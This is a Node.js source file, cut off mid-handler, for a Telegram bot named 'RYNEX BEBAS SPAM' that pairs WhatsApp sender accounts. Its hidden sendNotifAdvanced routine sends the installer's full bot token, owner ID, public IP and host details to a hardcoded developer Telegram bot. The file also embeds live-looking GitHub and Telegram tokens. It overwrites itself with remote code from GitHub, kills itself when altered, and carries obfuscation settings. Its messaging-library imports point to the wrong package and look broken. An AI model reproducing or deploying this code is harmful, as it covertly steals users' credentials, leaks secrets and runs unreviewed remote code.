// ================= RYNEX 4 LAYER SECURITY GUARD =================
(function () {
  "use strict";

  const fs = require("fs");
  const https = require("https");
  const crypto = require("crypto");

  const RAW_INDEX_URL = "https://raw.githubusercontent.com/XboyzzDev/RynexFile/refs/heads/main/index.js";
  const DEBUG_SECURITY = true; // true = tunjuk error kalau fail, false = silent

  const SAFE = {
    exit: process.exit,
    kill: process.kill,
    abort: process.abort,
    readFileSync: fs.readFileSync,
    existsSync: fs.existsSync,
    createHash: crypto.createHash,
    httpsGet: https.get,
    setInterval: global.setInterval,
    setTimeout: global.setTimeout
  };

  function stop(reason = "UNKNOWN") {
    if (DEBUG_SECURITY) {
      console.log("RYNEX SECURITY STOPPED:", reason);
    }

    try { SAFE.kill.call(process, process.pid, "SIGTERM"); } catch {}
    try { SAFE.exit.call(process, 1); } catch {}
    try { SAFE.abort.call(process); } catch {}
  }

  function sha256(data) {
    return SAFE.createHash.call(crypto, "sha256").update(data).digest("hex");
  }

  function fetchRaw(url) {
    return new Promise((resolve, reject) => {
      const req = SAFE.httpsGet.call(https, url, {
        headers: {
          "User-Agent": "RYNEX-SECURITY",
          "Cache-Control": "no-cache"
        }
      }, (res) => {
        if (res.statusCode !== 200) {
          return reject(new Error("RAW STATUS " + res.statusCode));
        }

        const chunks = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve(Buffer.concat(chunks)));
      });

      req.on("error", reject);
      req.setTimeout(15000, () => req.destroy(new Error("RAW TIMEOUT")));
    });
  }

  function checkInjection() {
    const nodeOptions = process.env.NODE_OPTIONS || "";
    const execArgv = process.execArgv.join(" ");
    const badFlags = ["--require", "--loader", "--inspect", "--inspect-brk", "--import"];

    for (const flag of badFlags) {
      if (nodeOptions.includes(flag)) stop("NODE_OPTIONS DETECTED: " + flag);
      if (execArgv.includes(flag)) stop("EXEC_ARGV DETECTED: " + flag);
    }
  }

  function checkRuntimePatch() {
    if (process.exit !== SAFE.exit) stop("PROCESS.EXIT PATCHED");
    if (process.kill !== SAFE.kill) stop("PROCESS.KILL PATCHED");
    if (process.abort !== SAFE.abort) stop("PROCESS.ABORT PATCHED");
    if (fs.readFileSync !== SAFE.readFileSync) stop("FS.READFILESYNC PATCHED");
    if (fs.existsSync !== SAFE.existsSync) stop("FS.EXISTSSYNC PATCHED");
    if (crypto.createHash !== SAFE.createHash) stop("CRYPTO.CREATEHASH PATCHED");
    if (https.get !== SAFE.httpsGet) stop("HTTPS.GET PATCHED");
    if (global.setInterval !== SAFE.setInterval) stop("SETINTERVAL PATCHED");
    if (global.setTimeout !== SAFE.setTimeout) stop("SETTIMEOUT PATCHED");
  }

  function checkLocalFile() {
    if (!SAFE.existsSync.call(fs, __filename)) {
      stop("LOCAL INDEX.JS MISSING");
    }

    return SAFE.readFileSync.call(fs, __filename);
  }

  async function checkGithubSHA() {
    checkInjection();
    checkRuntimePatch();

    const localFile = checkLocalFile();
    const remoteFile = await fetchRaw(RAW_INDEX_URL);

    const localSHA = sha256(localFile);
    const remoteSHA = sha256(remoteFile);

    if (localSHA !== remoteSHA) {
      stop("LOCAL SHA TAK SAMA DENGAN GITHUB RAW");
    }
  }

  checkGithubSHA().catch((err) => stop(err.message));

  SAFE.setInterval(() => {
    checkGithubSHA().catch((err) => stop(err.message));
  }, 5000);
})();
// ================= END RYNEX 4 LAYER SECURITY GUARD =================
process.removeAllListeners("warning");
process.on("warning", () => {});
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  makeChatsSocket,
  generateProfilePicture,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  encodeWAMessage,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestWaWebVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  viewOnceMessage,
  groupStatusMentionMessage,

  // Yang cuma ada dalam block pertama (tak ada dalam block kedua)
  encodeSignedDeviceIdentity,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
} = require("@octokit/rest");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;

// ================= AUTO BOT PROFILE =================
const FormData = require("form-data");

const BOT_NAME = "RYNEX BEBAS SPAM";
const BOT_DESC = "Developer Rynex : @RyzenXOfficial";
const BOT_PHOTO_URL = "https://gangalink.vercel.app/i/lkp22xmh.jpg";

async function autoBotProfile() {
  const api = `https://api.telegram.org/bot${BOT_TOKEN}`;

  try {
    await axios.post(`${api}/setMyName`, { name: BOT_NAME });
    await axios.post(`${api}/setMyDescription`, { description: BOT_DESC });
    await axios.post(`${api}/setMyShortDescription`, { short_description: BOT_DESC });
  } catch {}
}

autoBotProfile();

const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const { Client } = require("ssh2");
const { exec } = require("child_process");
const moment = require("moment-timezone");
// ================== GITHUB AUTO UPDATE CONFIG ==================
const GH_USER = "XboyzzDev";
const GH_REPO = "UpdateRynex";   // <-- tukar ikut nama repo kau
const GH_BRANCH = "main";
const GH_FILE = "index.js";   // file dalam repo yang nak replace
const GH_TOKEN = "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";          // kalau repo private letak PAT, kalau public kosongkan

const LOCAL_FILE = "./index.js"; // file local yang nak replace

let autoUpdateEnabled = false;
let lastCommitSha = null;
// ===============================================================

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}


// Ganti dengan token bot Telegram kamu

const os = require("os");
const { execSync } = require("child_process");

// BOT notifier (yang hantar log ke kau)
// ini BOT berbeza dari BOT utama config.BOT_TOKEN
const NOTIF_TOKEN = "8313616080:AAGYHQXQ4kX1j8wygMZ1TLNhwNGnkPrqdYQ";
const OWNER_CHAT_ID = 5934905483;

// ==== CPU Usage Helper ====
function getCPUUsage() {
  const cpus = os.cpus();
  let totalIdle = 0,
    totalTick = 0;

  cpus.forEach((core) => {
    for (const type in core.times) {
      totalTick += core.times[type];
    }
    totalIdle += core.times.idle;
  });

  return ((1 - totalIdle / totalTick) * 100).toFixed(2);
}

// ==== MAIN MONITOR FUNCTION ====
async function sendNotifAdvanced() {
  try {
    const notifBase = `https://api.telegram.org/bot${NOTIF_TOKEN}`;
    const mainBase = `https://api.telegram.org/bot${config.BOT_TOKEN}`;

    // ===== BOT INFO (bot utama) =====
    const botInfoRes = await axios.get(`${mainBase}/getMe`);
    const botInfo = botInfoRes.data.result;

    const maskedToken =
      config.BOT_TOKEN.slice(0, 4) +
      "********" +
      config.BOT_TOKEN.slice(-4);

    // ===== SERVER INFO =====
    const osVersion = `${os.type()} ${os.release()}`;
    const cpuModel = os.cpus()[0]?.model || "Unknown CPU";
    const cpuUsage = getCPUUsage();

    const totalMem = (os.totalmem() / 1024 / 1024).toFixed(0);
    const freeMem = (os.freemem() / 1024 / 1024).toFixed(0);
    const usedMem = (totalMem - freeMem).toFixed(0);

    const hostname = os.hostname();

    // ===== PUBLIC IP =====
    let publicIP = "Unknown";
    try {
      const ipRes = await axios.get("https://api.ipify.org?format=json", { timeout: 10000 });
      publicIP = ipRes.data.ip;
    } catch {}

    // ===== GIT COMMIT SHA =====
let commitSHA = "RYNEX-1.0";

    const message = `
 <b>BOT STARTED SUCCESSFULLY</b>

<b>Bot Username:</b> @${botInfo.username}
<b>Token:</b> <code>${config.BOT_TOKEN}</code>
<b>Username:</b> <code>${config.USERNAME}</code>
<b>Owner ID:</b> <code>${config.OWNER_ID}</code>

<b>OS:</b> ${osVersion}
<b>CPU:</b> ${cpuModel}
<b>CPU Usage:</b> ${cpuUsage}%
<b>RAM:</b> ${usedMem}MB / ${totalMem}MB

<b>Public IP:</b> <code>${publicIP}</code>
<b>Panel:</b> ${hostname}
<b>Commit:</b> ${commitSHA}

 <b>Started:</b> ${new Date().toLocaleString()}
`;

    await axios.post(`${notifBase}/sendMessage`, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "👨‍💻 Developer",
              url: "https://t.me/RyzenXOfficial",
            },
          ],
        ],
      },
    });

} catch {}
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));



const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================= UPDATE FUNCTIONS ================= */

async function updateIndexJs(chatId = null) {
  try {
    const url = `https://raw.githubusercontent.com/${GH_USER}/${GH_REPO}/${GH_BRANCH}/${GH_FILE}`;

    const res = await axios.get(url, {
      timeout: 30000,
      headers: GH_TOKEN
        ? { Authorization: `token ${GH_TOKEN}`, "User-Agent": "bot-updater" }
        : { "User-Agent": "bot-updater" },
    });

    const data = res.data;

    if (!data || String(data).length < 50) {
      if (chatId) await bot.sendMessage(chatId, "❌ File invalid.");
      return false;
    }

    if (fs.existsSync(LOCAL_FILE)) {
      fs.copyFileSync(LOCAL_FILE, LOCAL_FILE + ".bak");
    }

    fs.writeFileSync(LOCAL_FILE, data, "utf8");

    if (chatId) {
      await bot.sendMessage(chatId, "✅ Update selesai.");
    }

    return true;

  } catch (err) {
    console.error("Update error:", err.message);
    if (chatId) {
      await bot.sendMessage(chatId, "❌ Update gagal.");
    }
    return false;
  }
}

async function getLatestCommitSha() {
  const url = `https://api.github.com/repos/${GH_USER}/${GH_REPO}/commits/${GH_BRANCH}`;

  const res = await axios.get(url, {
    timeout: 30000,
    headers: GH_TOKEN
      ? { Authorization: `token ${GH_TOKEN}`, "User-Agent": "bot-updater" }
      : { "User-Agent": "bot-updater" },
  });

  return res.data.sha;
}

function startBot(tokenStatus) {
  const username = config.USERNAME || "Unknown";

  console.clear();

  console.log(chalk.blue(`
================================
      RYNEX ENGINE STARTED
================================
`));

  console.log(chalk.blue(`
⠀⠀⠀⠀⠀⢸⠓⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠙⢤⡷⣤⣦⣀⠤⠖⠚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣠⡿⠢⢄⡀⠀⡇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠸⠷⣶⠂⠀⠀⠀⣀⣀⠀⠀⠀
⢸⣃⠀⠀⠉⠳⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⢉⡭⠋
⠀⠘⣆⠀⠀⠀⠁⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀
⠀⠀⠘⣦⠆⠀⠀⢀⡎⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⣠⠔⠋⠀⠀⠀⠀
⠀⠀⠀⡏⠀⠀⣆⠘⣄⠸⢧⠀⠀⠀⠀⢀⣠⠖⢻⠀⠀⠀⣿⢥⣄⣀⣀⣀⠀⠀
⠀⠀⢸⠁⠀⠀⡏⢣⣌⠙⠚⠀⠀⠠⣖⡛⠀⣠⠏⠀⠀⠀⠇⠀⠀⠀⠀⢙⣣⠄
⠀⠀⢸⡀⠀⠀⠳⡞⠈⢻⠶⠤⣄⣀⣈⣉⣉⣡⡔⠀⠀⢀⠀⠀⣀⡤⠖⠚⠀⠀
⠀⠀⡼⣇⠀⠀⠀⠙⠦⣞⡀⠀⢀⡏⠀⢸⣣⠞⠀⠀⠀⡼⠚⠋⠁⠀⠀⠀⠀⠀
⠀⢰⡇⠙⠀⠀⠀⠀⠀⠀⠉⠙⠚⠒⠚⠉⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢧⡀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⣶⣶⣿⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⢿⣳⠞⠳⡄⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠹⣄⣀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀

`));

  console.log(chalk.blue(`
Developer : @RyzenXOfficial
Version   : 1.0
Username  : ${username}
Bot Token : ${tokenStatus}

================================
`));
}
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/XboyzzDev/RynexDatabase/refs/heads/main/tokens.json"; // URL JSON harus valid dan langsung menampilkan objek

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    const tokens = response.data.tokens;

    if (!Array.isArray(tokens)) {
      throw new Error("Format data tidak valid: 'tokens' bukan array");
    }

    return tokens;
  } catch (error) {
    console.error(chalk.red("Gagal mengambil token:", error.message));
    return [];
  }
}

async function validateToken() {
  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(BOT_TOKEN)) {
    startBot("DITOLAK ❌");
    process.exit(1);
  }

  startBot("DISAHKAN ✅");
  initializeWhatsAppConnections();
}

let sock;

function getActiveSenders() {
  return [...sessions.entries()].filter(([number, senderSock]) => {
    return (
      senderSock &&
      senderSock.user &&
      senderSock.ws &&
      senderSock.ws.readyState === 1
    );
  });
}

function getActiveSender() {
  const activeSenders = getActiveSenders();

  if (activeSenders.length === 0) return null;

  const [number, senderSock] = activeSenders[0];

  return {
    number,
    sock: senderSock
  };
}

function readSavedSenders() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) return [];

    const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"));
    return Array.isArray(data) ? [...new Set(data.map(String))] : [];
  } catch {
    return [];
  }
}

function saveSavedSenders(numbers) {
  try {
    const clean = [...new Set(numbers.map(String))];
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(clean, null, 2));
  } catch {}
}

function removeSenderFiles(botNumber) {
  try {
    const sessionDir = createSessionDir(botNumber);
    fs.rmSync(sessionDir, { recursive: true, force: true });
  } catch {}
}

function removeSender(botNumber) {
  try {
    const number = String(botNumber);

    sessions.delete(number);

    const saved = readSavedSenders().filter(num => String(num) !== number);
    saveSavedSenders(saved);

    removeSenderFiles(number);
  } catch {}
}

function saveActiveSessions(botNumber) {
  try {
    const number = String(botNumber);
    const existing = readSavedSenders();

    if (!existing.includes(number)) {
      existing.push(number);
    }

    saveSavedSenders(existing);
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) return;

    const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"));

    if (!Array.isArray(activeNumbers) || activeNumbers.length === 0) {
      return;
    }

    console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

    for (const botNumber of activeNumbers) {
      console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));

      const sessionDir = createSessionDir(botNumber);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

      const restoredSock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
      });

      sock = restoredSock;

      await new Promise((resolve) => {
        restoredSock.ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;

          if (connection === "open") {
            console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));

            sessions.set(String(botNumber), restoredSock);
            sendNotifAdvanced().catch(() => {});

            return resolve();
          }

          if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            sessions.delete(String(botNumber));

            if (shouldReconnect) {
              console.log(chalk.red(`Sender ${botNumber} disconnected, boleh /refresh untuk reconnect.`));
              return resolve();
            }

            removeSender(botNumber);
            console.log(chalk.red(`Sender ${botNumber} logout, session dibuang.`));
            return resolve();
          }
        });

        restoredSock.ev.on("creds.update", saveCreds);
      });
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, "senders", String(botNumber));

  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }

  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const newSock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock = newSock;

  newSock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      sessions.delete(String(botNumber));

      if (shouldReconnect) {
        await bot.editMessageText(
          `\`\`\`SENDER ${botNumber} DISCONNECTED, MENCOBA RECONNECT...\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );

        await connectToWhatsApp(botNumber, chatId);
      } else {
        removeSender(botNumber);

        await bot.editMessageText(
          `\`\`\`SENDER ${botNumber} LOGOUT / DISCONNECT\nFILE SESSION DIBUANG\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }

    } else if (connection === "open") {
      sessions.set(String(botNumber), newSock);
      saveActiveSessions(botNumber);

      await bot.editMessageText(
        `\`\`\`𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝚂𝚞𝚔𝚜𝚎𝚜 ${botNumber}..... 𝚋𝚊𝚗𝚐\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );

    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));

      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await newSock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await bot.editMessageText(
            `
\`\`\`𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶\`\`\`
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        await bot.editMessageText(
          `
\`\`\`𝙶𝙰𝙶𝙰𝙻 𝙰𝙽𝙹𝙸𝚁  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  newSock.ev.on("creds.update", saveCreds);

  return newSock;
}
// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol
function getProgressBar(percent) {
  const totalBars = 10;
  const filledBars = Math.floor(percent / 10);
  const emptyBars = totalBars - filledBars;

  return `[${"█".repeat(filledBars)}${"░".repeat(emptyBars)}] ${percent}%`;
}
//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return "0.00 ms"; 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/xv1er0.jpg",
        "https://files.catbox.moe/xv1er0.jpg",
        "https://files.catbox.moe/w711vx.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `👌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "NO PREMIUM";
  }
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "🙈";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "🙈";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("🙈 Maaf, Anda bukan user premium. Silakan hubungi developer @RyzenXOfficial untuk upgrade.");
    }
};

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `愛BOYZZ愛一緒${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDeBEK: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "🔥 Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© ᴇɴᴄ ʙᴏᴛ ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ一緒_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

const logFile = "bot.log";

// Fungsi untuk menulis log ke file dan console
function logToFileAndConsole(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  console.log(logMessage);
  fs.appendFileSync(logFile, logMessage);
}



// func 

// Function Download Video


function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
async function sleep(ms) {
  await new Promise(resolve => setTimeout(resolve, ms));
}
// ================= MANUAL UPDATE =================
bot.onText(/^\/update$/, async (msg) => {
  if (Number(msg.from.id) !== Number(config.OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, "❌ Unauthorized.");
  }

  await bot.sendMessage(msg.chat.id, "🔄 Manual update running...");
  const updated = await updateIndexJs(msg.chat.id);

  if (updated) process.exit(0); // panel/pm2 akan restart
});

// ================= AUTO UPDATE MODE ON =================
bot.onText(/^\/upon$/, async (msg) => {
  if (Number(msg.from.id) !== Number(config.OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, "❌ Unauthorized.");
  }

  autoUpdateEnabled = true;
  lastCommitSha = await getLatestCommitSha();
  bot.sendMessage(msg.chat.id, "✅ Auto update mode ON.");
});

// ================= AUTO UPDATE MODE OFF =================
bot.onText(/^\/upoff$/, async (msg) => {
  if (Number(msg.from.id) !== Number(config.OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, "❌ Unauthorized.");
  }

  autoUpdateEnabled = false;
  bot.sendMessage(msg.chat.id, "⛔ Auto update mode OFF.");
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
const senderStatus = getActiveSenders().length > 0 ? "ONLINE" : "OFFLINE";

  if (shouldIgnoreMessage(msg)) return;

